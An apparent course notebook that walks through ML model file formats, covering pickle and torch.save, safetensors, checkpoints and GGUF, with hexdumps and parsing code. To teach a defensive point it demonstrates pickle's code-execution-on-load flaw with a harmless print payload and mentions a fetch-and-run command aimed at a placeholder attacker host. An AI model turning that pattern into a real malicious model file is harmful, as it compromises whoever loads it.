# GGUF, the long way around

**DS635 — Machine Learning System Engineering · Module 4 (Inference Engineering & Model Optimization)**

A hands-on rebuild of Vicki Boykis' essay
[*GGUF, the long way around*](https://vickiboykis.com/2024/02/28/gguf-the-long-way-around/) (Feb 2024).
The essay walks from "what is a machine learning model" all the way to the byte layout of a GGUF file.
This notebook makes every step of that walk **executable**.

### The question

When you run a model locally, `llama.cpp` greets you with a wall of key-value pairs:

```text
llama_model_loader: loaded meta data with 24 key-value pairs and 291 tensors from
                    mistral-7b-instruct-v0.2.Q8_0.gguf (version GGUF V3 (latest))
llama_model_loader: - kv   0:              general.architecture str  = llama
llama_model_loader: - kv   2:              llama.context_length u32  = 32768
llama_model_loader: - kv   3:            llama.embedding_length u32  = 4096
llama_model_loader: - kv  13:             tokenizer.ggml.tokens arr[str,32000] = ["<unk>", "<s>", ...]
llama_model_loader: - type  f32:   65 tensors
llama_model_loader: - type q8_0:  226 tensors
llm_load_print_meta: model size = 7.17 GiB (8.50 BPW)
```

Every line of that log is a field in a file format. By the end of this notebook you will have
**written a GGUF file with the `gguf` library, dissected its bytes, parsed it back, and run inference from it** — and you will be
able to point the same parser at a real 7B model and reproduce that log yourself.

### The route

| § | Step | Format |
|---|------|--------|
| 1 | Train a model so we have something to save | *in memory* |
| 2 | What is actually in a model — the `state_dict` | Python objects |
| 3 | Objects → bytes | `pickle` |
| 4 | Why pickle is dangerous | (a live, harmless exploit) |
| 5 | Round-trip a model with `safetensors`, then dissect the file | `.safetensors` |
| 6 | The anatomy every binary format shares | — |
| 7 | Training state, not just weights | checkpoints |
| 8 | Local inference: GGML → GGUF | — |
| 9 | Write & read a model with the `gguf` library, then dissect it | `.gguf` |
| 10 | Read a real model file | `.gguf` |
| 11 | ONNX: the model as a program (a computation graph) | `.onnx` |
| 12 | Recap: what each format keeps, and what it drops | — |

### Course spine

Keep Lecture 3/4 in mind throughout. Token-by-token decode is **memory-bandwidth bound**: the machine
streams every weight from DRAM once per token and does ~2 FLOPs with each one. So the file format is
not a storage detail — *bytes per weight is the latency knob*, and every format below is judged by
how few bytes it stores per weight and how directly a reader can get at them.

### Requirements

`torch`, `numpy`, `safetensors`, and `gguf`. We use each format's own library to read and write, then
**dissect the bytes** by hand — that is where the understanding is. `pip install safetensors gguf` if
you don't already have them.

## 0. Setup

In [1]:
import io, json, math, os, pickle, pickletools, struct, sys, zipfile
from pathlib import Path

import numpy as np
import torch
import torch.nn as nn
import torch.optim as optim

torch.manual_seed(635)  # so the numbers below are reproducible

WORK = Path("gguf_artifacts")
WORK.mkdir(exist_ok=True)

print("python ", sys.version.split()[0])
print("torch  ", torch.__version__)
print("numpy  ", np.__version__)
print("writing artifacts to ./%s/" % WORK)

python  3.12.3
torch   2.13.0+rocm7.2
numpy   2.5.1
writing artifacts to ./gguf_artifacts/


In [2]:
def hexdump(data, n=64, base=0, label=None):
    "Classic 16-bytes-per-row hex + ASCII dump. Our microscope for the rest of the notebook."
    if label:
        print(label)
    for i in range(0, min(n, len(data)), 16):
        chunk = data[i:i + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"{base + i:08x}  {hexs:<47}  |{text}|")

hexdump(b"GGUF" + struct.pack("<I", 3), label="what a GGUF file starts with:")

what a GGUF file starts with:
00000000  47 47 55 46 03 00 00 00                          |GGUF....|


## 1. A model is a file — but first it has to be a program

In LLM land we care about transformers, which have a lot of moving parts: embeddings, positional
encoding, multi-head self-attention, layer norm, a feed-forward block, a projection back into vocab
space, a loss, and a backward pass that updates every parameter.

None of that machinery matters for understanding **artifacts**. So we take the essay's move and step
all the way down to a *linear regression* — which, as [d2l](https://d2l.ai/chapter_linear-regression/)
points out, is itself a (very shallow) neural network. Same PyTorch objects, same `state_dict`, same
serialization path — just two parameters instead of seven billion.

### The Nulltella problem

We produce artisanal hazelnut spread for statisticians, and we are more productive when it is sunny.
We do not produce on Friday–Sunday, because we spend those days writing about serialization formats.

| day | hours of sunshine | jars |
|-----|------------------|------|
| mon | 1 | 2 |
| tue | 2 | 4 |
| wed | 3 | 6 |
| thu | 4 | 8 |

$$ y = \beta_0 + \beta_1 x_1 + \epsilon $$

One feature ($x_1$, hours), one weight ($\beta_1$), one bias ($\beta_0$), and an error term we
minimise by gradient descent.

In [3]:
# Hours of sunshine
X = torch.tensor([[1.0], [2.0], [3.0], [4.0]], dtype=torch.float32)
# Jars of Nulltella
y = torch.tensor([[2.0], [4.0], [6.0], [8.0]], dtype=torch.float32)


class LinearRegression(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear = nn.Linear(1, 1)  # 1 input feature, 1 output feature

    def forward(self, x):
        return self.linear(x)


model = LinearRegression()
print(model)
print("state_dict at birth (randomly initialised):")
print(model.state_dict())

LinearRegression(
  (linear): Linear(in_features=1, out_features=1, bias=True)
)
state_dict at birth (randomly initialised):
OrderedDict({'linear.weight': tensor([[-0.3025]]), 'linear.bias': tensor([0.1816])})


### The `state_dict` is the model

That `OrderedDict` is the whole artifact. `nn.Module.state_dict()` is
[literally a Python dict](https://pytorch.org/tutorials/recipes/recipes/what_is_state_dict.html)
mapping *layer parameter name* → `Tensor`. Everything else — the class, the `forward` method — is
**code**, and lives in your source file, not in the saved file.

That split is the single most important idea in this notebook. Every format we look at is answering
the same question: *how do we write down a big pile of named tensors plus some metadata, and how much
of the surrounding Python do we drag along with it?*

In [4]:
criterion = nn.MSELoss()
optimizer = optim.SGD(model.parameters(), lr=0.01)

before = {k: v.clone() for k, v in model.state_dict().items()}

num_epochs = 100
for epoch in range(num_epochs):
    outputs = model(X)                 # forward pass
    loss = criterion(outputs, y)
    rmse_loss = torch.sqrt(loss)

    optimizer.zero_grad()              # zero out gradients
    rmse_loss.backward()               # compute gradients
    optimizer.step()                   # update weights

    if (epoch + 1) % 10 == 0:
        print(f"Epoch [{epoch + 1}/{num_epochs}], Loss: {loss.item():.4f}")

Epoch [10/100], Loss: 29.0686
Epoch [20/100], Loss: 20.7990
Epoch [30/100], Loss: 13.9236
Epoch [40/100], Loss: 8.4421
Epoch [50/100], Loss: 4.3538
Epoch [60/100], Loss: 1.6567
Epoch [70/100], Loss: 0.3356
Epoch [80/100], Loss: 0.1081
Epoch [90/100], Loss: 0.0965
Epoch [100/100], Loss: 0.0874


In [5]:
print("before:", dict(before))
print("after :", dict(model.state_dict()))
print()
# The equation we hoped to recover is y = 2x + 0
w = model.state_dict()["linear.weight"].item()
b = model.state_dict()["linear.bias"].item()
print(f"learned:  y = {w:.4f}x + {b:.4f}   (ground truth: y = 2x + 0)")

test_input = torch.tensor([[5.0]])
print(f"prediction for {test_input.item()} hours of sunshine: {model(test_input).item():.4f} jars")

before: {'linear.weight': tensor([[-0.3025]]), 'linear.bias': tensor([0.1816])}
after : {'linear.weight': tensor([[1.7551]]), 'linear.bias': tensor([0.7199])}

learned:  y = 1.7551x + 0.7199   (ground truth: y = 2x + 0)
prediction for 5.0 hours of sunshine: 9.4955 jars


The optimizer has a `state_dict` of its own — the hyperparameters, not the weights. Note this now:
it is exactly the thing that makes a **checkpoint** different from a weights file (§7).

In [ ]:
print(optimizer.state_dict())

## 2. How big is a model, really?

In [6]:
sd = model.state_dict()
total_params = 0
for name, t in sd.items():
    nbytes = t.element_size() * t.nelement()
    total_params += t.nelement()
    print(f"{name:<16} shape={str(tuple(t.shape)):<8} dtype={str(t.dtype):<14} "
          f"{t.nelement():>3} params  {nbytes:>3} bytes")

print(f"\ntotal: {total_params} parameters, "
      f"{sum(t.element_size() * t.nelement() for t in sd.values())} bytes")

linear.weight    shape=(1, 1)   dtype=torch.float32    1 params    4 bytes
linear.bias      shape=(1,)     dtype=torch.float32    1 params    4 bytes

total: 2 parameters, 8 bytes


The numbers above are the weights *in memory*. What actually lands on disk is bigger. Save the
model with `torch.save` and measure the file — the gap is the **container and the reconstruction
recipe**, not the data. (§4 opens this same file up to show what that overhead is made of.)

In [7]:
pt_path = WORK / "model.pt"
torch.save(model.state_dict(), pt_path)

weight_bytes = sum(t.element_size() * t.nelement() for t in sd.values())
file_bytes = pt_path.stat().st_size

print(f"weights on the heap : {weight_bytes:>7,} bytes")
print(f"{pt_path.name} on disk    : {file_bytes:>7,} bytes")
print(f"overhead            : {file_bytes - weight_bytes:>7,} bytes "
      f"({file_bytes / weight_bytes:.0f}x the payload)")

weights on the heap :       8 bytes
model.pt on disk    :   1,941 bytes
overhead            :   1,933 bytes (243x the payload)


## 3. Serialization: from heap to disk

We have stateful Python objects in memory. Training a real model took 24+ GPU-hours, so we would
very much like to persist it — which is exactly what §2 just did with `torch.save`.

**Serialization** is writing runtime objects out as a byte stream;
**deserialization** is the inverse.
(The name is historical: data used to live on *tape*, so bytes had to come off in serial order.)

The tensor's float data lives in a **C-allocated buffer** that the Python object merely points at. So a
serialization format has two jobs: write out that buffer, and write enough metadata to rebuild the
structure around it on load. The rest of this notebook is about how each format does those two things
— starting with the one `torch.save` actually uses.


The inverse operation — **deserialization** — is what makes the file worth writing. Load the weights
back into a fresh model and reuse it. If the round trip is lossless, the reloaded model predicts
exactly what the original did.

In [8]:

reloaded = LinearRegression()
reloaded.load_state_dict(torch.load(pt_path, weights_only=True))
reloaded.eval()

print("original prediction :", model(test_input).item())
print("reloaded prediction :", reloaded(test_input).item())
print("identical           :", torch.allclose(reloaded(test_input), model(test_input)))

original prediction : 9.495546340942383
reloaded prediction : 9.495546340942383
identical           : True


## 4. `pickle`, and the reason we left it

PyTorch's `torch.save` [wraps Python's `pickle`](https://pytorch.org/tutorials/beginner/saving_loading_models.html).
Pickle walks an object's inheritance hierarchy recursively and emits a little **stack program** that,
when replayed, reconstructs the object.

That is worth saying precisely: a pickle file is not data. It is *a program that builds data*.


In [9]:
import torch.nn as nn
import torch.optim as optim
import pickle

X = torch.tensor([[1.0], [2.0], [3.0], [4.0]], dtype=torch.float32)


pkl_path = WORK / "tensors.pkl"

# serialization
with open(pkl_path, "wb") as f:
    pickle.dump(X, f)

# deserialization
with open(pkl_path, "rb") as f:
    X = pickle.load(f, encoding='ASCII')
    print(X)


tensor([[1.],
        [2.],
        [3.],
        [4.]])


In [10]:
print(f"{pkl_path.name}: {pkl_path.stat().st_size} bytes for 4 floats (16 bytes of payload)\n")

buf = io.StringIO()
pickletools.dis(pkl_path.read_bytes(), out=buf)
lines = buf.getvalue().splitlines()
print("\n".join(lines[:14]))
print("   ...")
print("\n".join(lines[-8:]))

tensors.pkl: 407 bytes for 4 floats (16 bytes of payload)

    0: \x80 PROTO      4
    2: \x95 FRAME      396
   11: \x8c SHORT_BINUNICODE 'torch._utils'
   25: \x94 MEMOIZE    (as 0)
   26: \x8c SHORT_BINUNICODE '_rebuild_tensor_v2'
   46: \x94 MEMOIZE    (as 1)
   47: \x93 STACK_GLOBAL
   48: \x94 MEMOIZE    (as 2)
   49: (    MARK
   50: \x8c     SHORT_BINUNICODE 'torch.storage'
   65: \x94     MEMOIZE    (as 3)
   66: \x8c     SHORT_BINUNICODE '_load_from_bytes'
   84: \x94     MEMOIZE    (as 4)
   85: \x93     STACK_GLOBAL
   ...
  400: R        REDUCE
  401: \x94     MEMOIZE    (as 14)
  402: t        TUPLE      (MARK at 49)
  403: \x94 MEMOIZE    (as 15)
  404: R    REDUCE
  405: \x94 MEMOIZE    (as 16)
  406: .    STOP
highest protocol among opcodes = 4


Read that disassembly as instructions: push the name `torch._utils._rebuild_tensor_v2`, push
`torch.storage._load_from_bytes`, push the raw storage blob, `REDUCE` (i.e. **call**), build an
`OrderedDict`, `REDUCE` again, `STOP`.

`STACK_GLOBAL` + `REDUCE` is the dangerous pair. `STACK_GLOBAL` resolves *any* dotted name; `REDUCE`
calls it. The unpickler cannot tell `torch._utils._rebuild_tensor_v2` from `os.system`.

### Pickle store names, not actual objects

Before the dangerous use of that name resolution, the boring one — because it is the same
mechanism, and it explains a failure every practitioner eventually hits.

**A pickle stores the *path* to a class. It never stores the class.**

In [11]:
class Ingredient:
    "Defined here, in __main__. Watch what actually reaches the file."
    def __init__(self, name, jars):
        self.name, self.jars = name, jars

blob = pickle.dumps(Ingredient("nulltella", 7))
hexdump(blob, len(blob), label=f"pickle of one Ingredient ({len(blob)} bytes):")

buf = io.StringIO()
pickletools.dis(blob, out=buf)
print(buf.getvalue())

pickle of one Ingredient (74 bytes):
00000000  80 04 95 3f 00 00 00 00 00 00 00 8c 08 5f 5f 6d  |...?.........__m|
00000010  61 69 6e 5f 5f 94 8c 0a 49 6e 67 72 65 64 69 65  |ain__...Ingredie|
00000020  6e 74 94 93 94 29 81 94 7d 94 28 8c 04 6e 61 6d  |nt...)..}.(..nam|
00000030  65 94 8c 09 6e 75 6c 6c 74 65 6c 6c 61 94 8c 04  |e...nulltella...|
00000040  6a 61 72 73 94 4b 07 75 62 2e                    |jars.K.ub.|
    0: \x80 PROTO      4
    2: \x95 FRAME      63
   11: \x8c SHORT_BINUNICODE '__main__'
   21: \x94 MEMOIZE    (as 0)
   22: \x8c SHORT_BINUNICODE 'Ingredient'
   34: \x94 MEMOIZE    (as 1)
   35: \x93 STACK_GLOBAL
   36: \x94 MEMOIZE    (as 2)
   37: )    EMPTY_TUPLE
   38: \x81 NEWOBJ
   39: \x94 MEMOIZE    (as 3)
   40: }    EMPTY_DICT
   41: \x94 MEMOIZE    (as 4)
   42: (    MARK
   43: \x8c     SHORT_BINUNICODE 'name'
   49: \x94     MEMOIZE    (as 5)
   50: \x8c     SHORT_BINUNICODE 'nulltella'
   61: \x94     MEMOIZE    (as 6)
   62: \x8c     SHORT_BINUNICODE 'j

Two things to notice in that dump:

- **`__main__` and `Ingredient` are in there**, as ASCII, pushed by `STACK_GLOBAL`.
- **The `__init__` body is not.** Nor are the method names, nor the class hierarchy. Only
  `name` and `jars` — the *instance* state — plus a dotted path to look up.

So the file says: *find `__main__.Ingredient` wherever you are, make one without calling
`__init__`, then set these attributes on it.* Everything before "then" depends on the loading
process, not on the bytes.

Hand those same bytes to an interpreter that has never heard of `Ingredient`:

### Pickle allows for arbitary code execution

In [12]:
class Exploit:
    "Harmless demo of the pickle flaw: __reduce__ names a callable, and the unpickler calls it."
    def __reduce__(self):
        return (print, ("  ⚠️  arbitrary code executed during pickle.loads()",))


payload = pickle.dumps(Exploit())

buf = io.StringIO()
pickletools.dis(payload, out=buf)
print(buf.getvalue())

print("now merely *loading* it:")
_ = pickle.loads(payload)

    0: \x80 PROTO      4
    2: \x95 FRAME      84
   11: \x8c SHORT_BINUNICODE 'builtins'
   21: \x94 MEMOIZE    (as 0)
   22: \x8c SHORT_BINUNICODE 'print'
   29: \x94 MEMOIZE    (as 1)
   30: \x93 STACK_GLOBAL
   31: \x94 MEMOIZE    (as 2)
   32: \x8c SHORT_BINUNICODE '  ⚠️  arbitrary code executed during pickle.loads()'
   89: \x94 MEMOIZE    (as 3)
   90: \x85 TUPLE1
   91: \x94 MEMOIZE    (as 4)
   92: R    REDUCE
   93: \x94 MEMOIZE    (as 5)
   94: .    STOP
highest protocol among opcodes = 4

now merely *loading* it:
  ⚠️  arbitrary code executed during pickle.loads()


Nothing was exploited here — `print` is the "malicious" callable. Substitute
`os.system("curl attacker.example | sh")` and you have the real thing, in a file that looks exactly
like a set of model weights. This is why *model-hub supply-chain security* became a topic once
practitioners started uploading pickled artifacts to HuggingFace at scale, and why Trail of Bits
shipped [`fickling`](https://github.com/trailofbits/fickling) in 2021.

PyTorch's answer is `weights_only=True` — an allow-list unpickler. Since torch 2.6 it is the default.

In [13]:
evil_pt = WORK / "evil.pt"
torch.save({"weights": X, "surprise": Exploit()}, evil_pt)

try:
    torch.load(evil_pt, weights_only=True)
    print("loaded — no exploit possible")
except Exception as e:
    print("blocked by weights_only=True →", type(e).__name__)
    print(" ", str(e).strip().splitlines()[0][:160])

print("\nwith weights_only=False, the payload runs:")
_ = torch.load(evil_pt, weights_only=False)

blocked by weights_only=True → UnpicklingError
  Weights only load failed. This file can still be loaded, to do so you have two options, do those steps only if you trust the source of the checkpoint. 

with weights_only=False, the payload runs:
  ⚠️  arbitrary code executed during pickle.loads()


An allow-list is a patch, not a format fix. Note also what `torch.save` actually produces: since
PyTorch 1.6 it is a **zip container** — a pickle for structure plus one raw blob per tensor storage.
The tensor bytes are already separated out; the format just has not admitted it yet.

In [ ]:
pt_path = WORK / "model.pt"
torch.save(model.state_dict(), pt_path)

with zipfile.ZipFile(pt_path) as z:
    print(f"{pt_path.name} is a zip archive:\n")
    print(f"{'bytes':>8}  name")
    for info in z.infolist():
        print(f"{info.file_size:>8}  {info.filename}")
    print("\ndata.pkl (the structure) disassembled:")
    b = z.read([n for n in z.namelist() if n.endswith("data.pkl")][0])
buf = io.StringIO()
pickletools.dis(b, out=buf)
print("\n".join(buf.getvalue().splitlines()[:10]))
print("   ...")

### .pt/pickle summary

A `.pt` file is **not** "weights in a file." It is a **zip container** (since PyTorch 1.6) holding two
things: a `data.pkl` **program** that rebuilds the object graph, plus one raw blob per tensor storage.
`torch.save` writes that program; `torch.load` **runs** it.

And "program" is literal. Pickle is a tiny stack machine: `STACK_GLOBAL` resolves *any* dotted name and
`REDUCE` **calls** it. The unpickler cannot tell `torch._utils._rebuild_tensor_v2` from `os.system`.
Three consequences fall straight out:

| Flaw | Why | Where we saw it |
|------|-----|-----------------|
| **Executes on load** | loading *is* running the program — a crafted file runs anything | `Exploit.__reduce__` |
| **Python-coupled** | it stores the class's *name*, not the class; the exact class must be importable at load | "names, not objects" (`AttributeError`) |
| **Code tangled with data** | the layout is a program, not a static table you can read without executing it | the disassembly |

**Mitigation, and its limit.** `torch.load(..., weights_only=True)` (the default since torch 2.6) swaps
in an allow-list unpickler that refuses non-tensor globals — the exploit above is blocked. But an
allow-list is a **patch on a format**, not a format that is safe by construction: the bytes are still a
program, you are just trusting a filter to police it.

**Verdict: `.pt` is fine for your own checkpoints, wrong for shipping to strangers.** Everything the
next format does is a point-by-point answer to this table — don't execute, don't need Python, keep the
data as one flat buffer you can read (and `mmap`) without running anything.


## 5. safetensors: round-trip it, then dissect it

Take the three flaws from the table above and negate each one — you have essentially specified
[safetensors](https://github.com/huggingface/safetensors). HuggingFace designed it to be:

- **data, not a program** — nothing in the file is executable, so loading can't run anything
  (kills *executes on load*);
- **not Python-coupled** — the header names dtypes and shapes, not Python classes, so any language
  can read it (kills *Python-coupled*);
- **a flat, typed buffer** — tensors sit contiguously, each with an explicit dtype, so a reader can
  `mmap` the data and hand it to the GPU **zero-copy** (kills *code tangled with data*, and is what
  makes it fast).

The reference implementation is Rust, but the spec is language-agnostic — we write a reader and writer
in Python below. After a Trail of Bits / EleutherAI security audit it became the default format on the Hub.

Here is the **entire** spec:

- **8 bytes**: `N`, an unsigned little-endian 64-bit integer — the size of the header.
- **N bytes**: a JSON UTF-8 string, the header. Must begin with `{` (`0x7B`), may be right-padded
  with spaces (`0x20`). Shape:
  `{"TENSOR_NAME": {"dtype": "F16", "shape": [1, 16, 256], "data_offsets": [BEGIN, END]}, ...}`
  where offsets are relative to the **start of the byte buffer**, not the file. The key
  `__metadata__` may hold a free-form string→string map.
- **Rest of the file**: the byte buffer.

So `save_file` and `load_file` are one-liners — we use them, then crack the file open to confirm it
is exactly those three parts.

In [14]:
from safetensors.torch import save_file, load_file

st_path = WORK / "nulltella.safetensors"
save_file(model.state_dict(), st_path, metadata={"course": "DS635"})
print(st_path.name, "→", st_path.stat().st_size, "bytes")

# Load straight back into a fresh model and reuse it — same round trip as the .pt one in §3.
reborn = LinearRegression()
reborn.load_state_dict(load_file(st_path))
reborn.eval()

print("original    prediction :", model(test_input).item())
print("safetensors prediction :", reborn(test_input).item())
print("identical              :", torch.allclose(reborn(test_input), model(test_input)))

nulltella.safetensors → 184 bytes
original    prediction : 9.495546340942383
safetensors prediction : 9.495546340942383
identical              : True


In [ ]:
raw = st_path.read_bytes()
n, = struct.unpack("<Q", raw[:8])
print(f"header length N = {n} bytes\n")
print("header JSON:")
print(json.dumps(json.loads(raw[8:8 + n]), indent=2))
print()
hexdump(raw, n=96, label="the file itself:")
print(f"\n(the tensor buffer starts at offset {8 + n} = 0x{8 + n:x})")

### The same file, at real scale

Our model had two tensors. A real one has hundreds — but the format is identical, so the *same*
dissection works. `gpt2`'s `model.safetensors` is 548 MB, yet its header sits in the first few KB;
an HTTP **range request** reads just that, without downloading the weights.


In [15]:
# Same dissection, on a real model — via an HTTP range request, so we fetch the header, not the 548 MB.
import urllib.request

GPT2_URL = "https://huggingface.co/openai-community/gpt2/resolve/main/model.safetensors"

def fetch_range(url, start, end):                       # inclusive byte range
    req = urllib.request.Request(url, headers={"Range": f"bytes={start}-{end}"})
    return urllib.request.urlopen(req, timeout=30).read()

n, = struct.unpack("<Q", fetch_range(GPT2_URL, 0, 7))     # first 8 bytes  -> header length N
header = json.loads(fetch_range(GPT2_URL, 8, 8 + n - 1))  # next N bytes   -> the JSON header
header.pop("__metadata__", None)

buffer_mb = max(v["data_offsets"][1] for v in header.values()) / 1e6
print(f"gpt2 model.safetensors: header N = {n:,} bytes, {len(header)} tensors, {buffer_mb:.0f} MB of weights\n")

# Identical structure to nulltella — name -> {dtype, shape, data_offsets} — just 160 of them:
for name in list(header)[:4]:
    info = header[name]
    print(f"{name:<18} {info['dtype']} {str(info['shape']):<14} bytes{info['data_offsets']}")
print("   ...")

biggest = max(header, key=lambda k: header[k]["data_offsets"][1] - header[k]["data_offsets"][0])
b = header[biggest]
mb = (b["data_offsets"][1] - b["data_offsets"][0]) / 1e6
print(f"\nbiggest: {biggest:<18} {b['dtype']} {b['shape']}  ({mb:.0f} MB)")

gpt2 model.safetensors: header N = 14,283 bytes, 160 tensors, 548 MB of weights

h.3.ln_2.bias      F32 [768]          bytes[202420224, 202423296]
h.10.ln_1.weight   F32 [768]          bytes[223154176, 223157248]
h.2.attn.c_attn.weight F32 [768, 2304]    bytes[541012992, 548090880]
h.4.attn.c_proj.weight F32 [768, 768]     bytes[18954240, 21313536]
   ...

biggest: wte.weight         F32 [50257, 768]  (154 MB)


No code path to execute, language-agnostic, and the data section is a flat buffer you can `mmap` and
hand straight to the GPU without a copy — the exact opposite of the pickle stack program above.

### Close-up: a safetensors file is *only* the weights

Everything you just dissected is the same three things: an **8-byte length**, a **JSON header**
(per-tensor `dtype`, `shape`, `data_offsets`), and the **flat weight buffer**. 160 named tensors of
numbers — and nothing else.

**Not in the file:**

- the **tokenizer** — how text becomes token ids;
- the **vocabulary** — the 50,257 tokens themselves;
- the **architecture** — that `wte.weight` is a token embedding for a 12-layer GPT, the activation,
  the context length;
- the **generation defaults** — eos token, temperature, top-k.

The header knows a tensor is `[50257, 768]`. It does **not** know it is an embedding table, or what
row 42 spells. Where does the rest live? In sibling files in the same repo:

In [ ]:
import urllib.request

def get(u):
    return urllib.request.urlopen(u, timeout=30).read()

repo  = json.loads(get("https://huggingface.co/api/models/openai-community/gpt2"))
files = sorted(f["rfilename"] for f in repo["siblings"])
core  = ["model.safetensors", "config.json", "tokenizer.json",
         "vocab.json", "merges.txt", "generation_config.json"]

print(f"gpt2 repo ships {len(files)} files. The ones that actually run the model:")
for f in core:
    print("   ", "✓" if f in files else "(missing)", f)

cfg = json.loads(get("https://huggingface.co/openai-community/gpt2/resolve/main/config.json"))
print("\nconfig.json — the architecture the safetensors header never mentions:")
for k in ["model_type", "n_layer", "n_head", "n_embd", "n_positions", "vocab_size", "activation_function"]:
    print(f"   {k:<20} {cfg.get(k)}")

### How it all fits together to run a model

Four files, four jobs — a runtime (`transformers`, say) assembles them in order:

| File | Job |
|------|-----|
| `tokenizer.json` / `vocab.json` + `merges.txt` | text → token ids, and back |
| `config.json` | the blueprint — build the empty 12-layer architecture |
| `model.safetensors` | fill that architecture's tensors with trained weights, matched by name |
| `generation_config.json` | default decoding settings (eos, temperature, top-k) |

Generating one token, end to end:

1. **tokenize** the prompt → ids (needs the vocabulary);
2. build the model from **config**, load weights from **safetensors** (matched by tensor name);
3. **forward** the ids → logits over the 50,257-token vocab;
4. **sample** the next id, **detokenize** it, repeat.

safetensors does exactly one job — weights, safely and fast. The price: the **constellation must
travel together**. Lose `config.json` and the shapes are meaningless; lose the tokenizer and you can't
turn text into ids. Ship one file to a laptop and that scattering is the problem — which is exactly
what a single-file inference format sets out to fix.

## 6. What every binary format is made of

You just dissected one — and the same shape recurs across
[Arrow](https://arrow.apache.org/docs/format/CDataInterface.html),
[Parquet](https://parquet.apache.org/docs/file-format/),
[protobuf](https://protobuf.dev/), safetensors and GGUF. Five parts:

1. **A magic number** — bytes at offset 0 that say "I am a file of type X" (`GGUF`, `PAR1`, `\x89PNG`).
   safetensors is the exception: it opens straight with the 8-byte header length you just parsed.
2. **A header** — the metadata: how many tensors, what shapes, what dtypes, how many layers,
   which architecture.
3. **The data** — the actual tensor bytes, contiguous and dumb.
4. **A spec** — prose that tells a reader how to walk 1–3, so a parser can be written against it
   in any language.
5. **An endianness rule** — least-significant byte first (little) or last (big). It matters the
   moment a file crosses machines.

And in ML specifically, the payload is always the same three things:

- a large collection of **vectors**,
- **metadata** about those vectors (names, shapes, dtypes),
- **hyperparameters** (layer count, context length, vocab, rope base, …).

Hold on to that triple. safetensors handles the first two and punts on the third; GGUF's whole
contribution is doing all three in one file, extensibly.


## 7. Checkpoints: saving the run, not just the model

Mid-training you need to resume after a preemption or a hardware failure, so you save more than
weights: the **optimizer** `state_dict` (momentum buffers, lr, weight decay), the epoch, the last
loss, and anything else needed to continue. PyTorch's convention is just a dict, pickled.

In [ ]:
ckpt_path = WORK / "checkpoint.pt"
torch.save({
    "epoch": num_epochs,
    "model_state_dict": model.state_dict(),
    "optimizer_state_dict": optimizer.state_dict(),
    "loss": loss.item(),
}, ckpt_path)

ck = torch.load(ckpt_path, weights_only=False)
print("checkpoint keys:", list(ck))
print("epoch:", ck["epoch"], " loss:", round(ck["loss"], 6))
print("optimizer hyperparameters:", ck["optimizer_state_dict"]["param_groups"][0])
print("\nsize on disk:", ckpt_path.stat().st_size, "bytes "
      f"(vs {st_path.stat().st_size} for weights alone)")

Three observations to carry into §9:

- A checkpoint is *training* state. Nothing in it helps inference — an inference format can drop all
  of it, and GGUF does.
- It is still pickle, so it still executes on load.
- A real HF repo is now **many** files: `model-0000x-of-0000y.safetensors`, `config.json`,
  `tokenizer.json`, `generation_config.json`, … Every one of them must travel together.

## 8. Local inference, and the road to GGUF

Two things happened in 2022–23. Apple Silicon got fast enough to run real models, and Llama-2 shipped
open weights. Georgi Gerganov made Whisper run locally in
[`whisper.cpp`](https://github.com/ggerganov/whisper.cpp), then did the same for Llama in
[`llama.cpp`](https://github.com/ggerganov/llama.cpp), on top of the **GGML** tensor library.

GGML was a library *and* a format, aimed squarely at on-edge inference:

- **fp16 by default** — half the memory of torch's fp32, no meaningful accuracy loss at inference
- **C, not Python** — explicit allocation, no interpreter
- **tuned for Apple Silicon** (and later CUDA, ROCm, Vulkan, SYCL)
- **one file**: magic + version, hyperparameters, embedded vocabulary, then a list of
  length-prefixed named tensors

Everything in a single file was the right instinct and the fatal flaw. The hyperparameters were a
**fixed positional list**, so:

- adding one hyperparameter broke every existing reader — no backward compatibility;
- there was no architecture metadata in the file, so every model needed its own conversion script;
- the same brittleness recurred for each new model family.

**GGUF (GPT-Generated Unified Format)** keeps the layout and fixes the hinge: hyperparameters become a
**key–value lookup table** with typed values, instead of a positional list. New key, old reader — the
reader skips what it does not recognise. That is the entire idea, and it is why the `llama.cpp` log
prints `kv 0`, `kv 1`, `kv 2`: it is dumping that table.

## 9. GGUF: write one, read it back

safetensors needed sibling files. GGUF puts the **architecture, the tokenizer, the vocabulary, and the
weights in one file** — that is its whole reason to exist. The layout, from
[`ggml/docs/gguf.md`](https://github.com/ggerganov/ggml/blob/master/docs/gguf.md#file-structure):

1. **magic + version** — `GGUF`, then `3`;
2. a **typed key–value table** — the hyperparameters, and for real models the tokenizer + vocabulary;
3. a list of **tensor infos** — name, shape, type, offset into the data section;
4. the **tensor data** — aligned blobs, usually quantized.

We use the `gguf` library — the package `llama.cpp` ships — to write our Nutella model into that
layout, dissect the bytes to prove the four parts are there, then read it back and run it.

In [16]:
from gguf import GGUFWriter, GGUFReader

gguf_path = WORK / "nulltella.gguf"
writer = GGUFWriter(str(gguf_path), arch="linear-regression")
writer.add_name("nulltella")
writer.add_description("2-parameter Nutella model")
for name, t in model.state_dict().items():
    writer.add_tensor(name, t.detach().cpu().numpy())   # KV table + tensor infos + data, all handled
writer.write_header_to_file()
writer.write_kv_data_to_file()
writer.write_tensors_to_file()
writer.close()

print(gguf_path.name, "→", gguf_path.stat().st_size, "bytes")

nulltella.gguf → 352 bytes


### Dissect it — the four parts, in the bytes

Same move as safetensors: open the file and read the fixed header by hand. Magic, version, and the two
counts sit at known offsets; everything after them is the KV table, then the tensor infos and data.

In [17]:
blob = gguf_path.read_bytes()
hexdump(blob, n=112, label="the GGUF we just wrote:")
print()
print("offset 0..3   magic        :", blob[0:4])
print("offset 4..7   version      :", struct.unpack("<I", blob[4:8])[0])
print("offset 8..15  tensor_count :", struct.unpack("<Q", blob[8:16])[0])
print("offset 16..23 kv_count     :", struct.unpack("<Q", blob[16:24])[0])

the GGUF we just wrote:
00000000  47 47 55 46 03 00 00 00 02 00 00 00 00 00 00 00  |GGUF............|
00000010  03 00 00 00 00 00 00 00 14 00 00 00 00 00 00 00  |................|
00000020  67 65 6e 65 72 61 6c 2e 61 72 63 68 69 74 65 63  |general.architec|
00000030  74 75 72 65 08 00 00 00 11 00 00 00 00 00 00 00  |ture............|
00000040  6c 69 6e 65 61 72 2d 72 65 67 72 65 73 73 69 6f  |linear-regressio|
00000050  6e 0c 00 00 00 00 00 00 00 67 65 6e 65 72 61 6c  |n........general|
